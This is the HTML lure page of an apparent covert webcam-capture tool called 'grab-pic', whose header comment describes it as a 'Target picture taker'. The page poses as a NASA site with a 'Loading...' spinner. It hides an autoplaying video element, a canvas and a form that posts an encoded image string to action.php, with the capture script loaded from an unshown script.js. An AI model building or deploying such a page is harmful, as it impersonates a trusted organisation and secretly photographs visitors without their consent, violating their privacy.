<!--
  @grab-pic
  @author -> Sun Podder
  @github.com/SunPodder/grab-pic
  
  ** Target picture taker **
-->
<!DOCTYPE html>
<html>
  <head>
    <title>
      NASA - National Aeronautics and Space Administration
    </title>
    <style>
    
      p{
        text-align: center;
        font-size:100px;
      }
      
      #loading{
        font-size: 300px;
        animation: rotation 4s infinite;
       margin-top: 30vh;
      }
      
      @keyframes rotation{
        from{
          transform: rotate(0deg);
        }
        to{
          transform: rotate(360deg);
        }
      }
    </style>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
  </head>
  <body>
    <p id="loading">&#128540;</p>
    <p>Loading...</p>
    
    <div hidden>
      <form method="post" action="action.php" >
        <input name="name" id="name" >
        <input name="baseString" id="data">
      </form>
      <video id="video" autoplay ></video>
      <canvas id="canvas"></canvas>
    </div>
    <script src="script.js"></script>
  </body>
</html>
